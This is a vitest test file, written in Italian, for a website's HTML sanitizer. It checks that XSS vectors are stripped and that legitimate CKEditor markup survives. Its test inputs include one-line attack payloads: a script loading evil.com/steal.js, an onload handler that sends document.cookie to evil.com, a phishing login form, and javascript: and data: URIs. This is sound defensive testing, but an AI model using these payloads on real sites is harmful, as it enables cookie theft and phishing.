import { describe, it, expect } from "vitest";
const sanitizeHtml = require("sanitize-html");

// Ricreiamo la stessa configurazione usata in server.js
const SANITIZE_OPTIONS = {
  allowedTags: sanitizeHtml.defaults.allowedTags.concat([
    "img", "span", "div", "br", "h1", "h2", "h3", "h4", "h5", "h6",
    "figure", "figcaption", "video", "source", "iframe",
  ]),
  allowedAttributes: {
    ...sanitizeHtml.defaults.allowedAttributes,
    "*": ["class", "style", "id"],
    img: ["src", "alt", "title", "width", "height", "loading"],
    a: ["href", "target", "rel", "title"],
    iframe: ["src", "width", "height", "frameborder", "allowfullscreen"],
    video: ["src", "controls", "width", "height"],
    source: ["src", "type"],
  },
  allowedSchemes: ["http", "https", "mailto", "tel"],
  allowedIframeHostnames: ["www.youtube.com", "player.vimeo.com"],
};

function sanitize(dirty) {
  if (!dirty || typeof dirty !== "string") return dirty || "";
  let clean = sanitizeHtml(dirty, SANITIZE_OPTIONS);
  clean = clean.replace(/style\s*=\s*"[^"]*"/gi, (match) => {
    if (/javascript:|vbscript:|expression\s*\(/i.test(match)) return "";
    return match;
  });
  return clean;
}

// ── XSS Attack Vectors ─────────────────────────────────────────────

describe("sanitize - XSS Prevention", () => {
  it("rimuove tag <script>", () => {
    const input = '<script>alert("xss")</script>';
    expect(sanitize(input)).toBe("");
  });

  it("rimuove <script> con attributi", () => {
    const input = '<script src="https://evil.com/steal.js"></script>';
    expect(sanitize(input)).toBe("");
  });

  it("rimuove onerror da <img>", () => {
    const input = '<img src=x onerror="alert(1)">';
    const result = sanitize(input);
    expect(result).not.toContain("onerror");
    expect(result).toContain("<img");
  });

  it("rimuove onclick da elementi", () => {
    const input = '<div onclick="alert(1)">Cliccami</div>';
    const result = sanitize(input);
    expect(result).not.toContain("onclick");
    expect(result).toContain("Cliccami");
  });

  it("rimuove onload da <img>", () => {
    const input = '<img src="x.png" onload="fetch(\'https://evil.com?c=\'+document.cookie)">';
    const result = sanitize(input);
    expect(result).not.toContain("onload");
    expect(result).not.toContain("fetch");
  });

  it("rimuove onmouseover", () => {
    const input = '<span onmouseover="alert(1)">hover me</span>';
    const result = sanitize(input);
    expect(result).not.toContain("onmouseover");
    expect(result).toContain("hover me");
  });

  it("blocca javascript: nelle href", () => {
    const input = '<a href="javascript:alert(1)">click</a>';
    const result = sanitize(input);
    expect(result).not.toContain("javascript:");
  });

  it("blocca data: URI nelle href", () => {
    const input = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
    const result = sanitize(input);
    expect(result).not.toContain("data:");
  });

  it("rimuove <iframe> da domini non autorizzati", () => {
    const input = '<iframe src="https://evil.com/phishing"></iframe>';
    const result = sanitize(input);
    expect(result).not.toContain("evil.com");
  });

  it("rimuove tag <object> e <embed>", () => {
    expect(sanitize('<object data="evil.swf"></object>')).toBe("");
    expect(sanitize('<embed src="evil.swf">')).toBe("");
  });

  it("rimuove tag <form> (anti-phishing)", () => {
    const input = '<form action="https://evil.com/steal"><input type="password"><button>Login</button></form>';
    const result = sanitize(input);
    expect(result).not.toContain("<form");
    expect(result).not.toContain("evil.com");
  });

  it("rimuove SVG con onload (vettore XSS noto)", () => {
    const input = '<svg onload="alert(1)"><circle r="50"/></svg>';
    const result = sanitize(input);
    expect(result).not.toContain("onload");
    expect(result).not.toContain("<svg");
  });

  it("rimuove <meta> redirect", () => {
    const input = '<meta http-equiv="refresh" content="0;url=https://evil.com">';
    expect(sanitize(input)).toBe("");
  });

  it("rimuove <base> tag (hijack di URL relativi)", () => {
    const input = '<base href="https://evil.com/">';
    expect(sanitize(input)).toBe("");
  });
});

// ── Contenuto Lecito (NON deve essere rimosso) ─────────────────────

describe("sanitize - Contenuto Lecito", () => {
  it("mantiene <span> con class (colori titoli)", () => {
    const input = 'Testo <span class="text-primary">verde</span> normale';
    expect(sanitize(input)).toBe(input);
  });

  it("mantiene <br> (a capo nei titoli)", () => {
    const input = "Prima riga<br>Seconda riga";
    expect(sanitize(input)).toContain("<br");
  });

  it("mantiene <strong> e <em>", () => {
    const input = "<strong>Grassetto</strong> e <em>corsivo</em>";
    expect(sanitize(input)).toBe(input);
  });

  it("mantiene <a> con href sicuro", () => {
    const input = '<a href="https://www.b4us.it" target="_blank">B4US</a>';
    expect(sanitize(input)).toContain('href="https://www.b4us.it"');
  });

  it("mantiene <a> con mailto:", () => {
    const input = '<a href="mailto:info@b4us.it">Email</a>';
    expect(sanitize(input)).toContain('href="mailto:info@b4us.it"');
  });

  it("mantiene <a> con tel:", () => {
    const input = '<a href="tel:+390123456789">Chiama</a>';
    expect(sanitize(input)).toContain('href="tel:+390123456789"');
  });

  it("mantiene <img> con src sicuro", () => {
    const input = '<img src="https://strapi.b4us.it/uploads/logo.png" alt="Logo">';
    const result = sanitize(input);
    expect(result).toContain("<img");
    expect(result).toContain('alt="Logo"');
  });

  it("mantiene <ul> e <li> (liste CKEditor)", () => {
    const input = "<ul><li>Primo</li><li>Secondo</li></ul>";
    expect(sanitize(input)).toBe(input);
  });

  it("mantiene <p> e <div> (paragrafi CKEditor)", () => {
    const input = "<div><p>Paragrafo</p></div>";
    expect(sanitize(input)).toBe(input);
  });

  it("mantiene heading tags", () => {
    const input = "<h2>Sottotitolo</h2><h3>Sezione</h3>";
    expect(sanitize(input)).toBe(input);
  });

  it("mantiene <iframe> YouTube", () => {
    const input = '<iframe src="https://www.youtube.com/embed/abc123" width="560" height="315"></iframe>';
    const result = sanitize(input);
    expect(result).toContain("youtube.com");
    expect(result).toContain("<iframe");
  });

  it("mantiene style inline (class e style)", () => {
    const input = '<span style="color: red;" class="highlight">Rosso</span>';
    const result = sanitize(input);
    expect(result).toContain("style=");
    expect(result).toContain("class=");
  });

  it("mantiene <figure> e <figcaption> (immagini CKEditor)", () => {
    const input = '<figure><img src="test.jpg" alt="test"><figcaption>Didascalia</figcaption></figure>';
    const result = sanitize(input);
    expect(result).toContain("<figure>");
    expect(result).toContain("<figcaption>");
  });
});

// ── Edge Cases ─────────────────────────────────────────────────────

describe("sanitize - Edge Cases", () => {
  it("gestisce input null/undefined", () => {
    expect(sanitize(null)).toBe("");
    expect(sanitize(undefined)).toBe("");
    expect(sanitize("")).toBe("");
  });

  it("gestisce input non-stringa (passthrough falsy → stringa vuota)", () => {
    // Numeri truthy vengono restituiti via fallback ip || ""
    expect(sanitize(123)).toBe(123);
    expect(sanitize(0)).toBe("");
    expect(sanitize(false)).toBe("");
  });

  it("gestisce testo semplice senza HTML", () => {
    expect(sanitize("Solo testo normale")).toBe("Solo testo normale");
  });

  it("gestisce entita' HTML", () => {
    expect(sanitize("&amp; &lt; &gt;")).toBe("&amp; &lt; &gt;");
  });

  it("gestisce script annidato in attributi", () => {
    const input = '<div style="background:url(javascript:alert(1))">test</div>';
    const result = sanitize(input);
    expect(result).not.toContain("javascript:");
  });
});
